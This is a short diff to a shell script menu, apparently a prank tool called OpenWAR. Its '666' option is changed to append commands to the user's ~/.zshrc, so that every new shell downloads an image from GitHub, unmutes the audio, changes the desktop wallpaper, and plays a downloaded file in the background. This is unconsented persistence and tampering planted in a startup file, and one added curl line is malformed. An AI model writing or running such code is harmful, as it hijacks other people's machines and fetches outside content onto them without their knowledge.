@@ -146,8 +146,18 @@ while true; do
     i_app
     ;;
   666)
-	echo "" >> .zshrc
-	echo "nohup nvlc ~/libft.h &" >> .zshrc
+	# curl -o ~/._kagebunshinnojutsu https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
+    filewp=~/._kagebunshinnojutsu
+	# set wallpaper
+	echo "" >> ~/.zshrc
+	echo "
+		curl $filewp https://raw.githubusercontent.com/murmurlab/OpenWAR/refs/heads/main/IMG_0581.jpg
+		amixer set Master unmute
+		amixer set Master 10%
+		gsettings set org.gnome.desktop.background picture-uri $filewp
+		nohup nvlc ~/libft.h &
+	
+	" >> ~/.zshrc
     curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
     # counter=1
     # while [ $counter -le 9999 ]
